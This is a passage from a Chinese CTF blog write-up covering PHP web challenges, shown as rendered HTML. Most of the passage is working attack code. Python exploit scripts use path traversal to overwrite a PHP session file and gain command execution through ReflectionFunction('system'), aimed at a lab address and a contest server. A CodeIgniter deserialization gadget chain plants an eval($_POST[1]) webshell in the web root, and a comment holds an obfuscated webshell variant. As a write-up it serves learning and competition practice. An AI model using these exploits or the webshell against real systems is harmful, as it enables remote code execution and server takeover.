 $filelist[] = $temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$out = <span class="string">&#x27;&lt;p&gt;your file:&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($filelist <span class="keyword">as</span> $value)&#123;</span><br><span class="line">    $out .= $value.<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $out.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;files&#x27;</span>][$_GET[<span class="string">&#x27;file&#x27;</span>]])) &#123;</span><br><span class="line">        $pathinfo = <span class="keyword">array</span>($_GET[<span class="string">&#x27;file&#x27;</span>]=&gt;$_SESSION[<span class="string">&#x27;files&#x27;</span>][$_GET[<span class="string">&#x27;file&#x27;</span>]]);</span><br><span class="line">    <span class="comment">// var_dump($filelist);</span></span><br><span class="line">    <span class="comment">// var_dump($pathinfo);</span></span><br><span class="line">        <span class="comment">// var_dump(file_get_contents(&#x27;/var/lib/php/sessions/sess_moonback&#x27;));</span></span><br><span class="line">        $&#123;$_SESSION[<span class="string">&#x27;func&#x27;</span>]&#125;($pathinfo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no such file!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var_dump(file_get_contents(&#x27;/var/lib/php/sessions/sess_moonback&#x27;));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$ser = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_SESSION <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $ser .= $key.<span class="string">&#x27;|&#x27;</span>.serialize($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $ser;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://192.168.132.128/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request1</span>():</span></span><br><span class="line">    burp0_url = url + <span class="string">&quot;?file=id&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    r = requests.get(burp0_url, cookies=burp0_cookies)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request2</span>():</span></span><br><span class="line">    burp0_url = url + <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;</span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;../../../../../../../../../../../../../var/lib/php/sessions/sess_moonback&quot;</span>, </span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&#x27;func|s:8:&quot;filelist&quot;;files|a:1:&#123;s:2:&quot;id&quot;;s:2:&quot;id&quot;;&#125;paths|a:2:&#123;s:6:&quot;system&quot;;s:18:&quot;ReflectionFunction&quot;;s:10:&quot;invokeArgs&quot;;s:4:&quot;file&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">request2()</span><br><span class="line">request2()</span><br><span class="line">request1()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>说下rce咋构造  这样就可以执行system函数 并且参数是数组了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = <span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">[$c,<span class="string">&quot;invokeArgs&quot;</span>]([<span class="string">&quot;1&quot;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用$filelist构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[new ReflectionFunction(&#39;system&#39;),&quot;invokeArgs&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;func&#x27;</span>] = <span class="string">&#x27;filelist&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;files&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">$_SESSION[<span class="string">&#x27;paths&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>=&gt;<span class="string">&#x27;ReflectionFunction&#x27;</span>,<span class="string">&#x27;invokeArgs&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">$ser = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_SESSION <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $ser .= $key.<span class="string">&#x27;|&#x27;</span>.serialize($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $ser;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?file=id</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://123.57.78.168:64940/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request1</span>():</span></span><br><span class="line">    burp0_url = url + <span class="string">&quot;?file=id&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    r = requests.get(burp0_url, cookies=burp0_cookies)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request2</span>():</span></span><br><span class="line">    burp0_url = url + <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;</span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;../../../../../../../../../../../../../tmp/sess_moonback&quot;</span>, </span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&#x27;func|s:8:&quot;filelist&quot;;files|a:1:&#123;s:2:&quot;id&quot;;s:2:&quot;id&quot;;&#125;paths|a:2:&#123;s:6:&quot;system&quot;;s:18:&quot;ReflectionFunction&quot;;s:10:&quot;invokeArgs&quot;;s:4:&quot;file&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">request2()</span><br><span class="line">request1()</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-pop-revenge"><a href="#easy-pop-revenge" class="headerlink" title="easy_pop_revenge"></a><strong>easy_pop_revenge</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CodeIgniter</span>\<span class="title">Cache</span>\<span class="title">Handlers</span> &#123;</span><br><span class="line">    // <span class="title">use</span> <span class="title">CodeIgniter</span>\<span class="title">Session</span>\<span class="title">Handlers</span>\<span class="title">RedisHandler</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RedisHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $redis;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redis = <span class="keyword">new</span> \CodeIgniter\Session\Handlers\RedisHandler();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;logger = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CodeIgniter</span>\<span class="title">Session</span>\<span class="title">Handlers</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">CodeIgniter</span>\<span class="title">Log</span>\<span class="title">Logger</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RedisHandler</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $redis;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $redis = <span class="keyword">new</span> \Redis();</span><br><span class="line">            <span class="comment">// $redis-&gt;connect(&#x27;123.57.78.168&#x27;, 6379);</span></span><br><span class="line">            $redis-&gt;message = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redis = $redis;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;logger = <span class="keyword">new</span> Logger();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CodeIgniter</span>\<span class="title">Log</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">CodeIgniter</span>\<span class="title">Log</span>\<span class="title">Handlers</span>\<span class="title">FileHandler</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $loggableLevels;</span><br><span class="line">        <span class="keyword">protected</span> $handlerConfig;</span><br><span class="line">        <span class="keyword">protected</span> $handlers;</span><br><span class="line">        <span class="keyword">protected</span> $dateFormat;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loggableLevels = [<span class="string">&quot;error&quot;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handlerConfig = [<span class="string">&quot;mb&quot;</span>=&gt;<span class="string">&quot;qqq&quot;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handlers = [<span class="string">&quot;mb&quot;</span> =&gt; <span class="keyword">new</span> FileHandler()];</span><br><span class="line">            <span class="comment">// $this-&gt;dateFormat = urldecode(&#x27;<span class="meta">&lt;?=</span>$_=~\&#x27;%A0%B8%BA%AB\&#x27;;$__=$$_[1];$___=~\&#x27;%8C%86%8C%8B%9A%92\&#x27;;$___($__);<span class="meta">?&gt;</span>&#x27;);</span></span><br><span class="line">            <span class="comment">// 会date函数处理 构造出shell</span></span><br><span class="line">            <span class="comment">// echo date(&#x27;<span class="meta">&lt;?</span>p\hp \e\v\a\l(\$_\P\O\S\T[1]);<span class="meta">?&gt;</span>&#x27;);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;dateFormat = <span class="string">&#x27;&lt;?p\hp \e\v\a\l(\$_\P\O\S\T[1]);?&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CodeIgniter</span>\<span class="title">Log</span>\<span class="title">Handlers</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FileHandler</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">fileExtension</span>;</span><br><span class="line">        <span class="keyword">protected</span> $path;</span><br><span class="line">        <span class="keyword">protected</span> $handles;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="string">&#x27;/var/www/html/public/&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;fileExtension = <span class="string">&#x27;/../3.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handles = [<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filePermissions = <span class="number">777</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">ser</span> = <span class="title">new</span> \<span class="title">CodeIgniter</span>\<span class="title">Cache</span>\<span class="title">Handlers</span>\<span class="title">RedisHandler</span>();</span><br><span class="line">    <span class="comment">// echo serialize($ser);</span></span><br><span class="line">    <span class="keyword">echo</span> urlencode(base64_encode(serialize($ser)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2021/01/06/%E5%86%85%E9%83%A8wp/edi/>http://www.moonback.xyz/2021/01/06/%E5%86%85%E9%83%A8wp/edi/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-10-27T22:54:41+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年10月27日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2021/01/06/%E5%86%85%E9%83%A8wp/edi/&title=EDI内部平台部分题目writeup - 明月归的小站&summary=EDI内部平台部分题目writeup"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2021/01/06/%E5%86%85%E9%83%A8wp/edi/&title=EDI内部平台部分题目writeup - 明月归的小站&summary=EDI内部平台部分题目writeup"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2021/01/06/%E5%86%85%E9%83%A8wp/edi/&title=EDI内部平台部分题目writeup - 明月归的小站&summary=EDI内部平台部分题目writeup"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/01/30/%E6%AF%94%E8%B5%9B/2021/HGAME2021%E9%83%A8%E5%88%86writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>HGAME2020部分writeup</p>
+                <p class='content'>lai来了来了
+
+
+week1webHitchhiking_in_the_Galaxy伪造http请求信息
+
+watermelon控制台修改random函数
+1Math.random &#x3D...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/'>
+                <p class='title'>从VlunStack靶机二学习域渗透<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>闲来无事，跟着大佬思路做下！！！
+
+
+环境说明靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/
+内网网段：10.10.10.1/24
+...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#easycry"><span class="toc-text">easycry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yyds"><span class="toc-text">yyds</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BD%98%E5%8F%94%E7%9A%84%E9%92%B1%E5%8C%85%E7%9A%84%E9%99%84%E4%BB%B6"><span class="toc-text">潘叔的钱包的附件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bestphp"><span class="toc-text">bestphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firstweb"><span class="toc-text">firstweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qcode"><span class="toc-text">qcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#binew"><span class="toc-text">binew</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2021%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E6%80%BB%E5%86%B3%E8%B5%9B-upload"><span class="toc-text">2021红帽杯-总决赛-upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-pop-revenge"><span class="toc-text">easy_pop_revenge</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
